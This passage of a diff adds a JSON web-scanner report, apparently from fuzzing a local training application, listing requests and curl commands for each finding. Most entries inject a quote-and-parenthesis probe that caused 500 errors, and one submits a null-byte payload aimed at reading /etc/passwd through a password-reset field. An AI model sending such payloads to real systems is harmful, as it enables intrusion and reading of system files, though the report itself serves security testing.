+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fetc%2Fpasswd%00&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fetc%2Fpasswd%00&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/?%BF%27%22%28\"", 
+        "path": "/", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /signup?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/signup?%BF%27%22%28\"", 
+        "path": "/signup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /login?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/login?%BF%27%22%28\"", 
+        "path": "/login", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/credentials?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/credentials?%BF%27%22%28\"", 
+        "path": "/tutorials/credentials", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials?%BF%27%22%28\"", 
+        "path": "/tutorials", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/injection?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/injection?%BF%27%22%28\"", 
+        "path": "/tutorials/injection", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/broken_auth?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/broken_auth?%BF%27%22%28\"", 
+        "path": "/tutorials/broken_auth", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/xss?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/xss?%BF%27%22%28\"", 
+        "path": "/tutorials/xss", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/insecure_dor?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_dor?%BF%27%22%28\"", 
+        "path": "/tutorials/insecure_dor", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/misconfig?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/misconfig?%BF%27%22%28\"", 
+        "path": "/tutorials/misconfig", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/exposure?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/exposure?%BF%27%22%28\"", 
+        "path": "/tutorials/exposure", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/access_control?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/access_control?%BF%27%22%28\"", 
+        "path": "/tutorials/access_control", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/csrf?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/csrf?%BF%27%22%28\"", 
+        "path": "/tutorials/csrf", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/insecure_components?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_components?%BF%27%22%28\"", 
+        "path": "/tutorials/insecure_components", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/redirects?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/redirects?%BF%27%22%28\"", 
+        "path": "/tutorials/redirects", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/gauntlt?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/gauntlt?%BF%27%22%28\"", 
+        "path": "/tutorials/gauntlt", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/guard?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/guard?%BF%27%22%28\"", 
+        "path": "/tutorials/guard", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/mass_assignment?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/mass_assignment?%BF%27%22%28\"", 
+        "path": "/tutorials/mass_assignment", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/logic_flaws?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/logic_flaws?%BF%27%22%28\"", 
+        "path": "/tutorials/logic_flaws", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /tutorials/metaprogramming?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/metaprogramming?%BF%27%22%28\"", 
+        "path": "/tutorials/metaprogramming", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the query string", 
+        "http_request": "GET /forgot_password?%BF%27%22%28 HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password?%BF%27%22%28\"", 
+        "path": "/forgot_password", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter url", 
+        "http_request": "POST /sessions HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&url=%BF%27%22%28&email=default&password=letmein&commit=Login&remember_me=1", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/sessions\" -e \"http://localhost:3000/\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&url=%BF%27%22%28&email=default&password=letmein&commit=Login&remember_me=1\"", 
+        "path": "/sessions", 
+        "parameter": "url", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter email", 
+        "http_request": "POST /sessions HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&url=default&email=%BF%27%22%28&password=letmein&commit=Login&remember_me=1", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/sessions\" -e \"http://localhost:3000/\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&url=default&email=%BF%27%22%28&password=letmein&commit=Login&remember_me=1\"", 
+        "path": "/sessions", 
+        "parameter": "email", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Bemail%5D", 
+        "http_request": "POST /users HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/signup\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=%BF%27%22%28&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=letmein&user%5Bpassword_confirmation%5D=letmein&commit=Submit", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/users\" -e \"http://localhost:3000/signup\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=%BF%27%22%28&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=letmein&user%5Bpassword_confirmation%5D=letmein&commit=Submit\"", 
+        "path": "/users", 
+        "parameter": "user%5Bemail%5D", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Bpassword%5D", 
+        "http_request": "POST /users HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/signup\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=default&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=%BF%27%22%28&user%5Bpassword_confirmation%5D=letmein&commit=Submit", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/users\" -e \"http://localhost:3000/signup\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=default&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=%BF%27%22%28&user%5Bpassword_confirmation%5D=letmein&commit=Submit\"", 
+        "path": "/users", 
+        "parameter": "user%5Bpassword%5D", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter email", 
+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%BF%27%22%28&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%BF%27%22%28&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter email", 
+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%BF%27%22%28&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%BF%27%22%28&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }
+    ]
+  }
+}
